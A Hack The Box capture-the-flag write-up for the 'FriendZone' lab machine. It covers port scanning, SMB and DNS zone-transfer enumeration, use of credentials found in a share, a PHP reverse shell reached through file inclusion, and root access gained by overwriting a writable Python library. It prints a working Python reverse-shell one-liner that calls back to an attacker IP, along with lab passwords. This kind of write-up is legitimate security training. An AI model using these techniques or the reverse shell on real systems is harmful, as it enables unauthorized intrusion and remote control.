---
title: HTB | FriendZone
created: 2023-12-30
tags:
  - zone-transfer
  - dig
---
![](/Hackthebox/FriendZone/attachment/0b966bd6b15f1fdcdd416159cbaa5f5d.png)


# Enumeration
## Nmap

```
Nmap scan report for 10.129.31.11
Host is up (0.21s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: 404 Not Found
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -40m06s, deviation: 1h09m15s, median: -7s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-12-30T11:53:03+02:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-30T09:53:02
|_  start_date: N/A

```

### Open Ports
- 21 ftp 
- 22 ssh
- 53 dns 
- 80 http
- 139 netbios
- 443 https
- 445 smb
## FTP

We tried to check FTP for Anonymous login, but it failed.
And no such vulnerability pertinent to this FTP service version.

We will come back it we find any valid credentials.

## Apache

Both HTTP and HTTPS running Apache.
### HTTP

We found static page is running, but we can see a domain `friendzoneportal.red`. 

![](/Hackthebox/FriendZone/attachment/145c3d550ef81124d5ccf14072848625.png)



### HTTPS

After navigating to HTTPS, we checked the certificate and found another domain `friendzone.red`.

![](/Hackthebox/FriendZone/attachment/a185662c96976bc796dc6019f2d5b18a.png)

Next, we will add both domains to our /etc/hosts file and accessed the HTTPS.

![](/Hackthebox/FriendZone/attachment/992a6b11c75a21c3110f7e10a08da575.png)


## SAMBA

We will run smbmap utility to enumerate the share:

```
smbmap -H 10.129.227.130 
```

![](/Hackthebox/FriendZone/attachment/9aac3fd627a1e684548dd0e721e9eded.png)

Next we will use smbclient utility to access the share folders. 

![](/Hackthebox/FriendZone/attachment/b861810cab7d3265ae5274c310741754.png)
We found the creds.txt file and read the file.

```
└─$ cat creds.txt      
creds for the admin THING:

admin:WORKWORKHhallelujah@#

```


## DNS

We will do zone transfer using dig utility. 

```
dig axfr @10.129.31.11 friendzone.red
```

```
; <<>> DiG 9.19.17-1-Debian <<>> axfr @10.129.31.11 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 220 msec
;; SERVER: 10.129.31.11#53(10.129.31.11) (TCP)
;; WHEN: Sat Dec 30 06:26:16 EST 2023
;; XFR size: 8 records (messages 1, bytes 289)
```

```
dig axfr @10.129.31.11 friendzoneportal.red
```

```
; <<>> DiG 9.19.17-1-Debian <<>> axfr @10.129.31.11 friendzoneportal.red
; (1 server found)
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 220 msec
;; SERVER: 10.129.31.11#53(10.129.31.11) (TCP)
;; WHEN: Sat Dec 30 06:26:34 EST 2023
;; XFR size: 9 records (messages 1, bytes 309)
```

Next using the grep and awk tool, we got the domains to be added in the hosts file.
```
 cat zone | grep friend | grep IN | awk '{print $1}' | sed 's/\.$//g' | sort -u
```

```
admin.friendzoneportal.red
administrator1.friendzone.red
files.friendzoneportal.red
friendzoneportal.red
friendzone.red
hr.friendzone.red
imports.friendzoneportal.red
uploads.friendzone.red
vpn.friendzoneportal.red                        
```

Added the vhosts to the hosts file.

![](/Hackthebox/FriendZone/attachment/b71f55816c348cf8fdcd0d7ae3b94e5b.png)

Next, we will use aquatone utility to take screenshot of the hosts.

```
cat hosts | aquatone
```

```
Targets    : 9                                                                                                      
Threads    : 12
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

https://hr.friendzone.red: 404 Not Found
https://friendzone.red: 200 OK
https://files.friendzoneportal.red: 404 Not Found
https://imports.friendzoneportal.red: 404 Not Found
https://vpn.friendzoneportal.red: 404 Not Found
https://admin.friendzoneportal.red: 200 OK
https://friendzoneportal.red: 200 OK
https://uploads.friendzone.red: 200 OK
https://administrator1.friendzone.red: 200 OK
https://imports.friendzoneportal.red: screenshot successful
https://hr.friendzone.red: screenshot successful
https://files.friendzoneportal.red: screenshot successful
https://uploads.friendzone.red: screenshot successful
https://vpn.friendzoneportal.red: screenshot successful
https://admin.friendzoneportal.red: screenshot successful
https://administrator1.friendzone.red: screenshot successful
https://friendzoneportal.red: screenshot successful
https://friendzone.red: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done
```

## Gobuster

We will run Gobuster on this administrator vhost ` https://administrator1.friendzone.red/`

```
gobuster dir -k -u https://administrator1.friendzone.red -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php
```

![](/Hackthebox/FriendZone/attachment/8506b33ebe42f24772f25245a8b86db5.png)


![](/Hackthebox/FriendZone/attachment/9da68078b4a365d4224ca1cb94d2cfc0.png)


We will check the previously found 2 login page and 1 upload page.
#### https://admin.friendzoneportal.red

![](/Hackthebox/FriendZone/attachment/5a4f62e8c3d197bce6df6e76ad213b18.png)

![](/Hackthebox/FriendZone/attachment/05d41ecdeddffacdd16ed9cfc19492f1.png)

#### https://administrator1.friendzone.red/

![](/Hackthebox/FriendZone/attachment/fb4fd71a1a5312bd373c82f039f53f42.png)

We will use the credentials found during SAMBA enumeration to login.

![](/Hackthebox/FriendZone/attachment/629d7676f3d051ba40f6bf31529082d7.png)

![](/Hackthebox/FriendZone/attachment/b15d95254df68180084ca2eee66faaed.png)

We will use the param as the above and check, It displays the same as we seen previously during accessing /timestamp.php file.

![](/Hackthebox/FriendZone/attachment/46be5f8cf6574555b8879fb215e0a0cf.png)


# Initial Foothold

Earlier during SAMBA enumeration, we get to know that Development share has write access and we can assume that the Development share is under /etc. So, let's upload a php reverse shell and try to access it 

![](/Hackthebox/FriendZone/attachment/66186c4e81d6c116661e5318193f8bef.png)

Triggered this link and got a reverse shell.

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell
```

![](/Hackthebox/FriendZone/attachment/908b003b5919f4654325e7e66742f6d9.png)

Found the user flag under /home/friend.

![](/Hackthebox/FriendZone/attachment/446e849bf16150be14dac2f450b88377.png)

Next, we found DB credential in the `mysql_data.conf` file
```
friend:Agpyu12!0.213$
```

# Privilege Escalation

Next , we found reporter.py in the `/opt/server_admin` directory.

![](/Hackthebox/FriendZone/attachment/1381528c42c45701c9d78b9b0c6b0fc0.png)

So, we transferred the pspy64 script to look for the events running by root.

![](/Hackthebox/FriendZone/attachment/73e02ca53de3ded2160257c41bb20ec8.png)

Next we run the linpeas.sh and found we can write the os.py library file.

![](/Hackthebox/FriendZone/attachment/9054cbdf14bf1811df17c0e5136ca518.png)

We will write this python reverse shell code on os.py file and obtain a reverse shell with root privileges.
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.96",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![](/Hackthebox/FriendZone/attachment/8a7734641516690e589c81309c27c386.png)

And we read the root flag.


